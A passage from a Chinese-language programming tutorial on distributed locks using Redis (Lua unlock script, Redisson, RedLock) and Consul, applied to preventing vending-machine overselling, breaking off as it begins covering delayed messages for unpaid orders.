<p>如果是释放锁，比较简单的是直接把这个key删除掉。但是这样一来删除锁和加锁的不一定是同一个进程，所以我们需要释放锁的时候判断当前进程和加锁的进程是不是同一个进程，这就需要在删除前再查询一次，而这样一来就不是一个原子操作了。如果释放锁想要成为一个原子操作，比较常见的方案就是通过调用lua脚本来实现。</p>
<p>释放锁的lua脚本是这样写的：</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">'get'</span>, KEYS[<span class="hljs-number">1</span>]) == ARGV[<span class="hljs-number">1</span>] 
 <span class="hljs-keyword">then</span> 
 <span class="hljs-comment">-- 执行删除操作</span>
 <span class="hljs-keyword">return</span> redis.call(<span class="hljs-string">'del'</span>, KEYS[<span class="hljs-number">1</span>]) 
<span class="hljs-keyword">else</span> 
 <span class="hljs-comment">-- 不成功，返回0</span>
 <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> 
 <span class="hljs-keyword">end</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>在这个Lua脚本中，假设锁的键名为KEYS[1]，并且锁的值为ARGV[1]。脚本首先通过get命令获取锁的当前值，然后判断锁的当前值是否与传入的值相同。如果相同，则使用del命令删除该键，表示成功释放锁；如果不相同，则返回0，表示释放失败。</p>
<p>执行释放锁的lua脚本</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 解锁脚本</span>
<span class="hljs-title class_">DefaultRedisScript</span>&lt;<span class="hljs-title class_">Object</span>&gt; unlockScript = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>();
unlockScript.<span class="hljs-title function_">setScriptSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceScriptSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathResource</span>(<span class="hljs-string">"lockDel.lua"</span>)));
 <span class="hljs-comment">// 执行lua脚本解锁</span>
 redisTemplate.<span class="hljs-title function_">execute</span>(unlockScript, <span class="hljs-title class_">Collections</span>.<span class="hljs-title function_">singletonList</span>(keyName), value);
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>【知识点小节】</p>
<ol>
<li>如何实现redis分布式锁？</li>
</ol>
<p>（1）我们可以使用Redis的setNx命令加锁，对于我们常用的SpringDataRedis框架来说，可以使用setIfAbsent方法来实现加锁。</p>
<p>（2）这种方式的释放锁不具备原子性，所以我们需要将释放锁的操作放到lua脚本，在代码中调用lua脚本来实现。我们可以使用redisTemplate的execute方法来调用lua脚本。</p>
<h4 data-id="heading-17">3.3.3 Redisson组件封装实现</h4>
<p>因为setNx加锁存在几个弊端：</p>
<p>（1）释放锁调用lua脚本实现稍繁琐</p>
<p>（2）不可重入</p>
<p>（3）没有实现续期</p>
<p>我们使用Redisson组件可以很轻松地解决以上问题。 Redisson组件提供了可重入的，可以实现续期的分布式锁。Redisson组件为你提供了一个“看门狗”机制。</p>
<p>在项目中使用，参考以下步骤：</p>
<p>（1） 引入依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.redisson<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>redisson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.16.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）编写配置类</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Configuration</span>
 <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedissionConfig</span> {
   <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${spring.redis.host}</span>"</span>)</span>
   <span class="hljs-keyword">private</span> String redisHost;

   <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${spring.redis.password}</span>"</span>)</span>
   <span class="hljs-keyword">private</span> String password;

   <span class="hljs-keyword">private</span> int port = <span class="hljs-number">6379</span>;

   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> RedissonClient getRedisson() {
     Config config = new Config();
     config.useSingleServer().
     setAddress(<span class="hljs-string">"redis://"</span> + redisHost + <span class="hljs-string">":"</span> + port).
     setPassword(password);
     <span class="hljs-keyword">return</span> Redisson.create(config);
   }
 }
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）加锁和释放锁</p>
<p>引入RedissonClient</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Resource</span>
 <span class="hljs-keyword">private</span> RedissonClient redissonClient;
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>通过RLock加锁</p>
<pre><code class="hljs language-ini" lang="ini">RLock <span class="hljs-attr">rLock</span> = redissonClient.getLock(lockName)<span class="hljs-comment">;</span>
 boolean <span class="hljs-attr">isLocked</span> = rLock.tryLock(expireTime, TimeUnit.MILLISECONDS)<span class="hljs-comment">;</span>
 if (isLocked) {
 // TODO： 如果加锁成功 
 }
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>通过RLock释放锁</p>
<pre><code class="hljs language-ini" lang="ini">RLock <span class="hljs-attr">rLock</span> = redissonClient.getLock(lockName)<span class="hljs-comment">;</span>
 boolean <span class="hljs-attr">isLocked</span> = rLock.unLock()<span class="hljs-comment">;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>【知识点小节】</p>
<p>如何使用Redisson组件实现分布式锁？</p>
<p>（1）使用Redisson.create方法创建RedissonClient。</p>
<p>（2）通过redissonClient.getLock方法获取锁对象RLock。</p>
<p>（3）通过调用RLock的tryLock方法加锁</p>
<p>（4）通过调用RLock的unLock方法释放锁</p>
<h4 data-id="heading-18">3.3.4 RedLock算法的实现</h4>
<p>为什么需要使用红锁（RedLock）？</p>
<p>（1）如果我们连接的是一个单节点的Redis，有可能因为Redis宕机导致业务系统瘫痪。</p>
<p>（2）如果我们连接的是一个集群环境，有可能因为脑裂问题导致分布式锁失效。</p>
<p>脑裂 指的是因为网络通讯中断导致一个集群分裂为两个集群的现象。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14fa6fdd04da4eb19a1b7995dc8e8695~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=TyeC928XqPJ9zfkIPCTf98dktW8%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<p>（3）如果我们使用红锁算法，它所连接的多个节点，并不是一个集群，而是独立的，它的实现原理就是对每个节点依次加锁，超过半数成功，不超过半数失败。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d745924e5134121aa1e180628804aae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=52MpwZnVutZNoFeaNCa0tXUGC40%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<p>如何使用红锁，我们看代码：</p>
<p>（1） 引入redisson依赖 ，和上边的一样</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.redisson<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>redisson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.13.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）编写配置类，这个有些区别</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Configuration</span>
public class RedissionConfig {
  
    <span class="hljs-comment">/**
     * 红锁地址列表
     */</span>
    <span class="hljs-keyword">@Value</span>(<span class="hljs-string">"${elegent.lock.address}"</span>)
    private String[] address;

    <span class="hljs-keyword">@Bean</span>
    public RedissonClient[] getRedisson() {
        <span class="hljs-comment">//初始化</span>
        RedissonClient<span class="hljs-selector-attr">[]</span> redissonClients=new RedissonClient<span class="hljs-selector-attr">[ address.length  ]</span>;
        <span class="hljs-built_in">for</span>(int i=<span class="hljs-number">0</span>;i&lt;redisLockConfig.getAddress()<span class="hljs-selector-class">.length</span>;<span class="hljs-selector-tag">i</span>++){
            Config config = new <span class="hljs-built_in">Config</span>();
            config<span class="hljs-selector-class">.useSingleServer</span>()<span class="hljs-selector-class">.setAddress</span>( "redis://"+redisLockConfig.getAddress()<span class="hljs-selector-attr">[i]</span> );
            redissonClients<span class="hljs-selector-attr">[i]</span> = Redisson<span class="hljs-selector-class">.create</span>(config);
        }
        return redissonClients;
    }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）加锁和释放锁</p>
<p>先要初始化，假设我们有五个节点</p>
<pre><code class="hljs language-ini" lang="ini">//客户端
    private RedissonClient <span class="hljs-section">[]</span> redissonClients<span class="hljs-comment">;</span>

    @PostConstruct
    public void init() {
        //初始化
        <span class="hljs-attr">redissonClients</span>=new RedissonClient[ address.length  ]<span class="hljs-comment">;</span>
        for(int <span class="hljs-attr">i</span>=<span class="hljs-number">0</span><span class="hljs-comment">;i&lt;redisLockConfig.getAddress().length;i++){</span>
            Config <span class="hljs-attr">config</span> = new Config()<span class="hljs-comment">;</span>
            config.useSingleServer().setAddress( "redis://"+redisLockConfig.getAddress()<span class="hljs-section">[i]</span> )<span class="hljs-comment">;</span>
            redissonClients<span class="hljs-section">[i]</span> = Redisson.create(config)<span class="hljs-comment">;</span>
        }
    }  

   private RedissonRedLock getRedissonRedLock(String lockName){
        RLock <span class="hljs-attr">lock0</span> = redissonClients[<span class="hljs-number">0</span>].getLock(lockName)<span class="hljs-comment">;</span>
        RLock <span class="hljs-attr">lock1</span> = redissonClients[<span class="hljs-number">1</span>].getLock(lockName)<span class="hljs-comment">;</span>
        RLock <span class="hljs-attr">lock2</span> = redissonClients[<span class="hljs-number">2</span>].getLock(lockName)<span class="hljs-comment">;</span>
        RLock <span class="hljs-attr">lock3</span> = redissonClients[<span class="hljs-number">3</span>].getLock(lockName)<span class="hljs-comment">;</span>
        RLock <span class="hljs-attr">lock4</span> = redissonClients[<span class="hljs-number">4</span>].getLock(lockName)<span class="hljs-comment">;</span>
        return new RedissonRedLock(lock0,lock1,lock2,lock3,lock4)<span class="hljs-comment">;</span>
    }
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>业务代码中加锁和释放锁</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//红锁</span>
RedissonRedLock redLock=<span class="hljs-built_in">getRedissonRedLock</span>(lockName);  
redLock<span class="hljs-selector-class">.tryLock</span>(<span class="hljs-number">60</span> ,TimeUnit.SECONDS);<span class="hljs-comment">//加锁   参数1是过期时间 ，如果给-1则表示续期</span>
redLock<span class="hljs-selector-class">.unlock</span>();<span class="hljs-comment">//释放锁</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>【知识点小节】</p>
<p>如何使用红锁？</p>
<p>（1）创建每个redis节点的RedissonClient</p>
<p>（2）通过每个redis节点的RedissonClient构建RedissonRedLock 。</p>
<p>（3）通过RedissonRedLock的实例的tryLock加锁，unlock释放锁。</p>
<h3 data-id="heading-19">3.4 Elegent-lock</h3>
<h4 data-id="heading-20">3.4.1 Elegent-lock简介</h4>
<p>这是一个基于springboot的优雅的分布式锁组件。使用这个组件可以让你更轻松、更优雅地在项目中集成分布式锁，让你更专注业务代码的开发。它目前支持redis分布式锁、consul分布式锁两种实现方式，可以通过更改配置自由切换而不需要更改业务代码。</p>
<p>开源项目地址： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fchuanzhiliubei%2Felegent-lock" title="https://gitee.com/chuanzhiliubei/elegent-lock" target="_blank" ref="nofollow noopener noreferrer">gitee.com/chuanzhiliu…</a></p>
<h4 data-id="heading-21">3.4.2 Elegent-lock快速入门</h4>
<h5 data-id="heading-22">集成</h5>
<p>1.在项目中引入依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.lock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-lock-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>2.在项目配置文件添加配置，示例如下：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">elegent:</span>
  <span class="hljs-attr">lock:</span>
    <span class="hljs-attr">type:</span> <span class="hljs-string">redis</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:6379</span>
    <span class="hljs-attr">wait:</span> <span class="hljs-number">10</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>配置说明：</p>
<p>（1）type: 分布式锁类型，可选值：consul、redis，默认值是redis。</p>
<p>（2）host: 分布式锁中间件的部署地址，默认值为127.0.0.1。</p>
<p>（3）wait: 等待超时时间，单位秒，默认值10。表示在获取不到锁的时候会在此时间内会进行重试。</p>
<h5 data-id="heading-23">代码方式</h5>
<p>类中引入ElegentLock</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> ElegentLock elegentLock;
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>方法调用以下方法实现加锁与释放锁</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">//参数说明： 锁名称，过期时间，是否自旋</span>
boolean b = elegentLock.<span class="hljs-keyword">lock</span>(name,<span class="hljs-number">60</span>,<span class="hljs-literal">false</span>);
<span class="hljs-comment">//todo: 业务逻辑</span>
System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"业务逻辑"</span>+b);
elegentLock.unLock(name);
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h5 data-id="heading-24">注解方式</h5>
<p>在方法上添加注解<code>@ELegentLock(lockName = "test",isSpin= true,ttl=10)</code> 即可。</p>
<p><code>lockName</code>为锁名字，实际加锁会以<code>lockName</code>+方法参数作为锁key。</p>
<p><code>always =true</code>，加锁，如果锁被占用会通过自旋方式不断尝试，直到加成功为止。</p>
<p><code>always =false</code>，（默认值）加锁，只尝试一次。推荐使用此选项。</p>
<p>我们可以运行Elegent提供的demo代码，进行快速学习。</p>
<h3 data-id="heading-25">3.5 基于Consul分布式锁</h3>
<h4 data-id="heading-26">3.5.1 Consul简介</h4>
<p>Consul是HashiCorp公司推出的开源工具，用于实现分布式系统的服务发现与配置。 Consul是分布式的、高可用的、可横向扩展的。它具备以下特性 :</p>
<p>服务发现：consul通过DNS或者HTTP接口使服务注册和服务发现变的很容易。<br/>
健康检查：健康检测使consul可以快速的告警在集群中的操作。<br/>
键/值存储：一个用来存储动态配置的系统。提供简单的HTTP接口，可以在任何地方操作。<br/>
多数据中心：无需复杂的配置，即可支持任意数量的区域。</p>
<p>一句话概况：</p>
<p>Consul既可以用于注册中心和配置中心，也可以做keyValue存储。使用Consul做分布式锁的底层原理就是keyValue存储。</p>
<p>课程提供了配套的 consul 本地运行环境</p>
<h4 data-id="heading-27">3.5.2 项目为什么使用Consul做分布式锁？</h4>
<p>Consul的分布式锁与Redis分布式锁有什么不同？项目为什么使用Consul做分布式锁？</p>
<p>一句话概况：</p>
<p>因为Consul分布式锁是CP架构的，使用 Raft 算法来保证一致性。相比之下，Redis由于是AP架构，可能因为脑裂造成数据不一致，如果采用Redis红锁性能又很差。所以，当时我们权衡利弊，决定采用Consul分布式锁。</p>
<p>红锁会有弊端。时间复杂度变高（响应时间边长，吞吐量变低） ，空间复杂度变高了。</p>
<h4 data-id="heading-28">3.5.3 Consul做分布式锁快速入门</h4>
<p>修改配置文件 为consul</p>
<h2 data-id="heading-29">4 分布式锁解决超卖问题</h2>
<h3 data-id="heading-30">4.1 问题分析</h3>
<p>首先我们先说为什么会产生超买的问题。</p>
<p>如果售货机是带屏幕的，理论上来说是不会产生超卖问题的。因为带屏幕的售货机实际中就只能是独占类型的操作，但是如果是不带屏幕的售货机，用户就需要扫描售货机上的二维码来进行购买操作， 那么假设有两个用户在相近的时间点在同一台售货机购买了同一个商品， 而恰好这件商品只有一件了，就会可能产生超卖的问题。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/495f65418e504665afb86a120b5f23b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=jbsfGFIHihZ1vOMVReOhoXiEQzA%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<p>为什么会超卖呢？我们看一下下面的图：</p>
<p>这是一个用户的购买时序图</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ca6945323e04f18aec825913afc50a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=GnRAZbl8YJxasJJaWO6cnI2VUOA%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<p>当用户下单时，会判断当前要购买的商品在该售货机的库存，如果当前库存为1件，也是可以下单的，用户这个时候下单并支付，支付成功后，支付系统回调我们的订单微服务，订单微服务向售货机发送出货指令，售货机终端执行出货，并向服务端上报结果，服务端的售货机微服务再扣减库存。这期间其实至少也需几秒左右的时间才能完成。而如果在这期间，另外一个人也着急购买商品，扫描并下单购买同一个商品，那么这个时候第一个人购买的流程还没有结束，库存还没有扣减，所以显示的商品仍然还有一件，那他仍然可以下单。等他支付完成后，售货机没有商品可以出货了，这个时候就产生了超卖。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f68c5d10ad6d4ad0b05f88f19aea71e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=TiN2BJKPmiYAQUf8A1fWk4umJd4%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<p>这样我们就会产生超卖的现象。</p>
<h3 data-id="heading-31">4.2 实现思路</h3>
<p>那么如何解决超卖现象呢？我们就需要使用分布式锁来解决。</p>
<p>user1在下单前需要加锁，在扣减库存后要释放锁。这样，就确保user2在下单时上一个流程是已经跑完的，此时的库存就是准确的，就不会产生超卖的问题了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d1fc320bf174cacbe4ac0ac47e85d79~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=xO5XE%2FScLggA%2BmfHAW3Zf4wLZ7I%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<h3 data-id="heading-32">4.3 代码实现</h3>
<h4 data-id="heading-33">4.3.1 订单微服务加锁</h4>
<p>（1）在订单微服务的pom文件引入依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.lock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-lock-consul<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）在订单微服务的配置（配置中心）中添加以下配置</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">elegent:</span>
  <span class="hljs-attr">lock:</span>
    <span class="hljs-attr">type:</span> <span class="hljs-string">consul</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8500</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）在OrderServiceImpl的createOrder方法中添加分布式锁代码：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">ElegentLock</span> eLegentLock;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">OrderEntity</span> <span class="hljs-title function_">createOrder</span>(<span class="hljs-params">PayVO payVO,<span class="hljs-built_in">String</span> platform</span>) {
        <span class="hljs-comment">//判断库存</span>
        <span class="hljs-keyword">if</span>( !vmService.<span class="hljs-title function_">hasCapacity</span>(payVO.<span class="hljs-title function_">getInnerCode</span>(), <span class="hljs-title class_">Long</span>.<span class="hljs-title function_">valueOf</span>(payVO.<span class="hljs-title function_">getSkuId</span>())) ){
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicException</span>(<span class="hljs-string">"商品库存不足"</span>);
        }

        <span class="hljs-comment">//加锁，判断上次交易是否完成</span>
        <span class="hljs-built_in">boolean</span> lock = eLegentLock.<span class="hljs-title function_">lock</span>(payVO.<span class="hljs-title function_">getInnerCode</span>() + <span class="hljs-string">"-"</span> + payVO.<span class="hljs-title function_">getSkuId</span>(), <span class="hljs-number">60</span>, <span class="hljs-literal">false</span>);
        <span class="hljs-keyword">if</span>(!lock){
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicException</span>(<span class="hljs-string">"上一笔交易未完成，请稍后！"</span>);
        }
        ..................................
    }
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-34">4.3.2 售货机微服务释放锁</h4>
<p>（1）在售货机微服务的pom文件引入依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.lock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-lock-consul<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）在售货机微服务的配置（配置中心）中添加以下配置</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">elegent:</span>
  <span class="hljs-attr">lock:</span>
    <span class="hljs-attr">type:</span> <span class="hljs-string">consul</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8500</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）在VendOutResultHandler的process方法中添加释放分布式锁代码：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> ElegentLock elegentLock;

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">(String s,VendoutResultDTO vendoutResultDTO)</span> <span class="hljs-keyword">throws</span> Exception {
    log.info(<span class="hljs-string">"接收到出货结果,{}"</span>, vendoutResultDTO);
    ..........       
    <span class="hljs-comment">//释放锁</span>
    elegentLock.unLock( vendoutResultDTO.getInnerCode()+<span class="hljs-string">"-"</span>+vendoutResultDTO.getSkuId() );
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-35">5.超时订单处理方案-延迟消息</h2>
<h3 data-id="heading-36">5.1 需求分析</h3>
<p>有很多时候，用户下单后，并不一定会支付。如果用户一直不支付，那么这个订单岂不是一直处于未支付状态，这并不利于我们的订单管理，我们通常的做法是设定一个时效，超过这个时间，需要将这个订单更改为无效状态，并且在支付平台将这笔交易关闭掉。</p>
<h3 data-id="heading-37">5.2 实现思路</h3>
<p>（1）在下单时，通过AC框架发送异步消息，延迟时间为5分钟。发送内容为订单号</p>
<p>协议封装: OrderCheck 封装的是订单号</p>
<p>主题封装: TopicConfig.ORDER_CHECK_TOPIC</p>
<p>如果延迟5分钟,前缀为 $delayed/300/</p>
<p>（2）在订单服务中接收延迟消息, 从协议中解析出订单号, 查询订单，如果此订单未支付则修改为无效订单，并关闭此支付交易单。</p>
<h3 data-id="heading-38">5.3 代码实现</h3>
<h4 data-id="heading-39">5.3.1 主题定义与协议封装</h4>
<p>（1）TopicConfig定义延迟订单主题</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">/**
 * 延迟订单主题
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">static</span> <span class="hljs-type">String</span> ORDER_CHECK_TOPIC = <span class="hljs-string">"server/order/check"</span>;
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）service_common定义OrderCheckDTO，用于封装订单号</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">/**
 * 订单延迟检查协议类
 */</span>
@Data
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCheckDTO</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> orderNo;

}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-40">5.3.2 发送延迟消息</h4>
<p>OrderServiceImpl引入</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> ElegentAC elegentAC;
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>在OrderServiceImpl 的createOrder方法<strong>结尾处</strong>添加以下代码</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//将订单放到延迟队列中，5分钟后检查支付状态！！！！！！！！！！！！！！！！！！</span>
OrderCheckDTO orderCheck = new <span class="hljs-built_in">OrderCheckDTO</span>();
orderCheck<span class="hljs-selector-class">.setOrderNo</span>(orderEntity.getOrderNo());
try {
    elegentAC<span class="hljs-selector-class">.delayPublish</span>(TopicConfig.ORDER_CHECK_TOPIC,orderCheck,<span class="hljs-number">300</span>);
} catch (Exception e) {
    log<span class="hljs-selector-class">.error</span>("send to emq error",e);
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-41">5.3.3 接收延迟消息</h4>
<p>在订单服务项目中实现接收到该消息的处理代码：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">/**
 * 订单超时处理
 */</span>
<span class="hljs-variable">@Topic</span>(TopicConfig.ORDER_CHECK_TOPIC)
